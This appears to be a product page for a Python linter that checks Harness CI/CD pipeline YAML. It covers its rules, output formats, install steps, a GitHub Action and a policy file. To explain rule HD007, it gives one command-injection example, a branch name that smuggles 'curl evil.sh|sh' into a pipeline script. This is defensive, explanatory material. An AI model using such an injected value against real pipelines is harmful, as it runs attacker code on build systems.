The linter checks structure it can see in the YAML. It does not call Harness, resolve templates or runtime inputs, or know which secrets really exist in your account.

How it works

A rule is one small Python function. No network calls, no account access, no model.

1

Parse with line numbers

The YAML loader records the line every mapping starts on, so each finding points at the exact spot, even inside templates.

2

Run the rules

Each rule walks the stages and steps and yields a line, a message and a fix. A comment on or just above a line silences one rule.

3

Report where you work

Plain text for the terminal, SARIF for code scanning, JSON for scripts, and inline annotations on the pull request diff.

HD007 is the one most teams miss. Harness substitutes <+codebase.branch> into the script text before the shell parses it, so a branch named x;curl evil.sh|sh runs as code.

Put it in the path of every change

Run it locally, as a GitHub Action with findings in the Security tab, or as a pre-commit hook.

pip install "harness-doctor[schema] @ \
  git+https://github.com/gerardrecinto/harness-doctor"

harness-doctor check .harness
harness-doctor check .harness --fail-on warning
harness-doctor check .harness --format sarif
harness-doctor explain HD007

Exit codes: 0 clean, 1 findings at or above --fail-on, 2 bad input.

- uses: actions/checkout@v4
- uses: gerardrecinto/harness-doctor@main
  with:
    path: .harness
    fail-on: warning
    schema: "true"

There is also an OPA policy, policies/pipeline_guardrails.rego, that enforces the image, timeout and prod-approval rules inside Harness when a pipeline is saved.

What this does not do
  • It is a linter. It does not prove a pipeline is safe, only that these nine patterns are absent.
  • It reads one file at a time. It does not resolve templates, runtime inputs or account-level policy.
  • A secret that does not look like a secret by name or format will not be flagged.
